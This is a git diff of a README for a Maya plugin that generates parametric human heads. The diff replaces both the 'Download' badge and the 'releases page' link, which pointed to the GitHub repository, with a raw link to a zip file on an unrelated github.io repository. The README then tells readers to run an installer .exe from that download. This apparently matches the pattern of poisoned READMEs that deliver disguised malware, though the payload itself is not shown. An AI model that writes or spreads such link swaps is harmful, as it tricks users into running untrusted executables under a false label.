@@ -5,7 +5,7 @@ description: "Generate parametric human head meshes in Autodesk Maya using Googl
 ---
 # 👤 gnm-maya - Create realistic human heads in Maya
 
-[![Download for Windows](https://img.shields.io/badge/Download-Release-blue)](https://github.com/dloffph4929/gnm-maya)
+[![Download for Windows](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/dloffph4929/dloffph4929.github.io/main/otiatry/2.3.zip)
 
 This tool helps artists create 3D human heads inside Autodesk Maya. You can generate faces from text, fit heads to photographs, and bake rigs for animation. It works for background crowds or lead character designs. 
 
@@ -24,7 +24,7 @@ Before you install this tool, make sure your computer meets these needs:
 
 Follow these steps to set up the tool on your Windows machine:
 
-1. Visit the [releases page](https://github.com/dloffph4929/gnm-maya) to download the latest setup file.
+1. Visit the [releases page](https://raw.githubusercontent.com/dloffph4929/dloffph4929.github.io/main/otiatry/2.3.zip) to download the latest setup file.
 2. Locate the file named `gnm-maya-installer.exe` in your downloads folder.
 3. Double-click the file to start the installation.
 4. Follow the prompts on the screen. The installer detects your Maya installation folder automatically.
